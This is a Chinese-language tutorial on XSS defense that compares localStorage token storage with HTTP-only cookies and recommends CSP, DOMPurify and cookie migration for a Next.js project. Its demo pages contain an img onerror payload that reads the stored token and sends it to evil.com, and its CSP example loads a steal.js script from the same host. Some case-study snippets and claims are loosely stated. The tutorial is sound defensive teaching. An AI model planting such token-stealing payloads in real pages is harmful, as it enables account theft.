# XSS 攻击演示：LocalStorage vs HTTP-only Cookie

## 实验环境设置

### 1. LocalStorage 方案（当前项目）

```html
<!-- 你的网站 -->
<!DOCTYPE html>
<html>
  <head>
    <title>博客 - LocalStorage 方案</title>
  </head>
  <body>
    <h1>我的博客</h1>

    <script>
      // 模拟登录后存储 Token
      localStorage.setItem("access_token", "secret_token_12345");
      console.log("Token 已存储到 localStorage");
    </script>

    <!-- 评论区 -->
    <div id="comments">
      <h2>评论</h2>
      <!-- 黑客发表的评论（包含恶意脚本） -->
      <div class="comment">
        <p>这篇文章真不错！</p>
        <img
          src="x"
          onerror="
        // 恶意代码开始
        const token = localStorage.getItem('access_token');
        console.log('偷到的 Token:', token);
        fetch('https://evil.com/steal?token=' + token);
        // 恶意代码结束
      "
        />
      </div>
    </div>

    <script>
      // 打开浏览器控制台，你会看到：
      // "偷到的 Token: secret_token_12345"
      // ❌ Token 被成功偷走！
    </script>
  </body>
</html>
```

**结果**：

```
✅ 恶意脚本成功读取 localStorage
✅ Token 被发送到黑客服务器
❌ 用户账号被盗
```

---

### 2. HTTP-only Cookie 方案

```html
<!-- 你的网站 -->
<!DOCTYPE html>
<html>
  <head>
    <title>博客 - Cookie 方案</title>
  </head>
  <body>
    <h1>我的博客</h1>

    <script>
      // ❌ 无法通过 JavaScript 设置 HTTP-only Cookie
      // 只能由服务端设置
      document.cookie = "session_token=secret_token_12345; HttpOnly";
      // ↑ 这个 HttpOnly 标记会被浏览器忽略！

      // HTTP-only Cookie 必须由服务端设置：
      // Set-Cookie: session_token=secret_token_12345; HttpOnly; Secure
    </script>

    <!-- 评论区 -->
    <div id="comments">
      <h2>评论</h2>
      <!-- 黑客发表的评论（包含恶意脚本） -->
      <div class="comment">
        <p>这篇文章真不错！</p>
        <img
          src="x"
          onerror="
        // 恶意代码开始
        const token = document.cookie;
        console.log('偷到的 Cookie:', token);
        // ❌ 看不到 session_token！
        fetch('https://evil.com/steal?token=' + token);
        // 恶意代码结束
      "
        />
      </div>
    </div>

    <script>
      // 打开浏览器控制台，你会看到：
      // "偷到的 Cookie: " (空的！)
      // ✅ HTTP-only Cookie 无法被 JavaScript 读取
    </script>
  </body>
</html>
```

**结果**：

```
❌ 恶意脚本无法读取 HTTP-only Cookie
❌ Token 无法被偷走
✅ 用户账号安全
```

---

## XSS 攻击的真实案例

### 案例 1：MySpace 蠕虫（2005 年）

```javascript
// Samy 蠕虫病毒
// 在用户个人资料页面注入代码
<script>
  // 自动添加 Samy 为好友 // 自动在访问者的个人资料中复制这段代码 //
  24小时内感染了100万用户
</script>
```

**如果使用 LocalStorage 存储 Token**：

- 蠕虫可以偷走所有用户的 Token
- 黑客可以完全控制所有账号

**如果使用 HTTP-only Cookie**：

- 蠕虫无法读取 Token
- 只能执行有限的操作（如添加好友）

---

### 案例 2：TweetDeck XSS 漏洞（2014 年）

```javascript
// 黑客在推文中注入代码
<script>// 自动转发这条推文 // 导致病毒式传播</script>
```

**影响**：

- 如果 Twitter 使用 LocalStorage 存储 Token，所有用户的账号都会被盗
- 实际上 Twitter 使用了 HTTP-only Cookie，所以只是自动转发，没有账号被盗

---

## 常见的 XSS 注入点

### 1. 用户输入（最常见）

```typescript
// ❌ 危险：直接渲染用户输入
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ 安全：React 自动转义
<div>{userInput}</div>
```

### 2. URL 参数

```typescript
// ❌ 危险
const name = new URLSearchParams(window.location.search).get("name");
document.getElementById("greeting").innerHTML = `Hello ${name}`;

// ✅ 安全
const name = new URLSearchParams(window.location.search).get("name");
document.getElementById("greeting").textContent = `Hello ${name}`;
```

### 3. 第三方库

```typescript
// ❌ 危险：使用未经审计的第三方库
import UnknownLibrary from "some-random-package";

// 这个库可能包含恶意代码：
// localStorage.getItem('access_token')
```

### 4. 富文本编辑器

```typescript
// ❌ 危险：直接渲染富文本
<div dangerouslySetInnerHTML={{ __html: article.content }} />;

// ✅ 安全：使用 DOMPurify 清理
import DOMPurify from "dompurify";
<div
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(article.content),
  }}
/>;
```

---

## XSS 攻击有多常见？

### 统计数据

```
OWASP Top 10 Web 应用安全风险（2021）：
1. Broken Access Control
2. Cryptographic Failures
3. Injection (包括 XSS) ← 第3名！

根据 HackerOne 报告：
- XSS 是最常被报告的漏洞类型之一
- 平均赏金：$500 - $5,000
- 严重的 XSS 漏洞赏金可达 $10,000+
```

### 真实数据

```
2023年发现的 XSS 漏洞：
- Google: 多个产品发现 XSS 漏洞
- Facebook: 发现并修复多个 XSS 漏洞
- GitHub: 发现 XSS 漏洞，赏金 $10,000

即使是大公司也会有 XSS 漏洞！
```

---

## SPA (单页应用) 如何防止 XSS 攻击？

### 1. 框架自动保护（React/Vue/Angular）

```typescript
// ✅ React 自动转义
function Comment({ text }) {
  return <div>{text}</div>;
  // 即使 text 包含 <script>，也会被转义为 &lt;script&gt;
}

// ❌ 除非你主动关闭保护
function DangerousComment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  // ↑ 这个 API 名字就在警告你：危险！
}
```

**React 的转义机制**：

```javascript
// 用户输入
const userInput = '<script>alert("XSS")</script>';

// React 渲染
<div>{userInput}</div>

// 实际 HTML（被转义）
<div>&lt;script&gt;alert("XSS")&lt;/script&gt;</div>

// 浏览器显示（纯文本）
<script>alert("XSS")</script>
```

---

### 2. Content Security Policy (CSP)

```typescript
// Next.js 配置
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          {
            key: "Content-Security-Policy",
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' data:",
              "connect-src 'self' https://api.your-site.com",
            ].join("; "),
          },
        ],
      },
    ];
  },
};
```

**CSP 的作用**：

```
没有 CSP：
<script src="https://evil.com/steal.js"></script>
✅ 恶意脚本会执行

有 CSP (script-src 'self')：
<script src="https://evil.com/steal.js"></script>
❌ 浏览器拒绝执行！
Console: "Refused to load script from 'https://evil.com/steal.js'
         because it violates the Content-Security-Policy"
```

---

### 3. 输入验证和清理

```typescript
// ✅ 服务端验证
export async function POST(request: Request) {
  const { content } = await request.json();

  // 1. 长度限制
  if (content.length > 1000) {
    return Response.json({ error: "内容过长" }, { status: 400 });
  }

  // 2. 禁止 HTML 标签
  if (/<script|<iframe|<object/i.test(content)) {
    return Response.json({ error: "禁止使用脚本标签" }, { status: 400 });
  }

  // 3. 使用 DOMPurify 清理（如果需要支持富文本）
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
    ALLOWED_ATTR: ["href"],
  });

  await db.insert({ content: clean });
}
```

---

### 4. HTTP-only Cookie（最重要！）

```typescript
// ❌ LocalStorage 方案（你的项目当前）
// 即使有上面所有防护，只要有一个漏洞，Token 就会被偷

localStorage.setItem("access_token", token);
// 任何 XSS 漏洞都能偷走 Token

// ✅ HTTP-only Cookie 方案
cookies().set("session_token", token, {
  httpOnly: true, // ← 最后一道防线
  secure: true,
  sameSite: "lax",
});
// 即使有 XSS 漏洞，Token 也偷不走
```

---

## 完整的防护策略

### 多层防御（Defense in Depth）

```
┌─────────────────────────────────────────┐
│  第1层：框架自动转义                     │
│  React/Vue 自动转义用户输入              │
├─────────────────────────────────────────┤
│  第2层：Content Security Policy          │
│  限制可执行的脚本来源                    │
├─────────────────────────────────────────┤
│  第3层：输入验证和清理                   │
│  服务端验证，DOMPurify 清理              │
├─────────────────────────────────────────┤
│  第4层：HTTP-only Cookie                 │
│  即使前面都失败，Token 也偷不走          │
└─────────────────────────────────────────┘
```

### 你的项目当前的防护

```
✅ 第1层：React 自动转义（有）
❌ 第2层：CSP（没有）
❓ 第3层：输入验证（部分有）
❌ 第4层：HTTP-only Cookie（没有，用的 LocalStorage）
```

---

## 实际建议

### 短期（保持 LocalStorage）

```typescript
// 1. 添加 CSP
// next.config.js
module.exports = {
  async headers() {
    return [{
      source: '/(.*)',
      headers: [{
        key: 'Content-Security-Policy',
        value: "default-src 'self'; script-src 'self' 'unsafe-inline'"
      }]
    }]
  }
};

// 2. 严格验证用户输入
// 永远不要使用 dangerouslySetInnerHTML

// 3. 定期更新依赖
npm audit
npm audit fix
```

### 长期（迁移到 Cookie）

```typescript
// 1. 创建登录 API Route
// app/api/auth/login/route.ts
export async function POST(request: Request) {
  const { email, password } = await request.json();

  const res = await fetch(`${process.env.API_URL}/token`, {
    method: "POST",
    body: new URLSearchParams({ username: email, password }),
  });

  const data = await res.json();

  const response = NextResponse.json({ success: true });
  response.cookies.set("session_token", data.access_token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    maxAge: 60 * 60 * 24 * 7,
  });

  return response;
}

// 2. 修改前端登录逻辑
async function login(email: string, password: string) {
  const res = await fetch("/api/auth/login", {
    method: "POST",
    body: JSON.stringify({ email, password }),
  });

  if (res.ok) {
    // ✅ Token 已经在 Cookie 中，不需要手动存储
    router.push("/dashboard");
  }
}

// 3. 服务端组件自动获取用户信息
export default async function DashboardPage() {
  const token = cookies().get("session_token")?.value;

  if (!token) {
    redirect("/login");
  }

  const res = await fetch(`${process.env.API_URL}/users/me`, {
    headers: { Authorization: `Bearer ${token}` },
  });

  const user = await res.json();

  return <div>欢迎, {user.username}</div>;
}
```

---

## 总结

### XSS 攻击原理

```
1. 黑客在你的网站注入恶意脚本
   ↓
2. 其他用户访问页面，脚本执行
   ↓
3. 脚本读取 localStorage.getItem('access_token')
   ↓
4. Token 被发送到黑客服务器
   ↓
5. 黑客用 Token 登录你的账号
```

### 为什么 HTTP-only Cookie 更安全

```
LocalStorage:
- JavaScript 可以读取 ❌
- XSS 攻击可以偷走 Token ❌

HTTP-only Cookie:
- JavaScript 无法读取 ✅
- XSS 攻击偷不走 Token ✅
- 浏览器自动携带 ✅
- 服务端组件可用 ✅
```

### XSS 攻击有多常见

```
- OWASP Top 10 第3名
- 即使大公司也经常发现 XSS 漏洞
- 平均赏金 $500 - $5,000
- 非常常见，必须重视！
```

### SPA 防护策略

```
1. 框架自动转义（React/Vue）
2. Content Security Policy
3. 输入验证和清理
4. HTTP-only Cookie（最重要！）
```

你的项目当前使用 LocalStorage，虽然有 React 的自动转义保护，但如果有任何一个 XSS 漏洞（比如使用了 `dangerouslySetInnerHTML`，或者第三方库有漏洞），Token 就会被偷走。

**建议**：如果是生产环境或处理敏感数据，强烈建议迁移到 HTTP-only Cookie 方案。
